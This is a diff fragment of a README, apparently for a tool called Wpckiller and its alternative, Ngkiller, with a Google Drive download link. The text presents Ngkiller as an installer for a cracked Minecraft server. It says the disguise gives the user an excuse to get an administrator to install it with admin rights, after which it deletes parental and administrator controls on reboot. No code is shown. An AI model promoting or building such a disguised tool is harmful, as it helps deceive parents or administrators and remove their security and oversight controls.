@@ -9,7 +9,8 @@ He reboot into "setup mode" and delete the files of parental control with admin 
 
 ## Wpckiller have now and an alternative Ngkiller 
 It is an Installer for Nations Glory ( Cracked minecraft server ) and he give you an excuse to your administrator to install and the admin permision to program. It will be very quick and he delete parental/administrator when your reboot the pc
-ttps://drive.google.com/file/d/1-NwMmq95qQZ3QTcdHqeAmWJaAacncFlH/view?usp=sharing the direct link ;}
+
+https://drive.google.com/file/d/1-NwMmq95qQZ3QTcdHqeAmWJaAacncFlH/view?usp=sharing the direct link ;}
 ### admin-permission required
 
 cbaie9 2020-2022
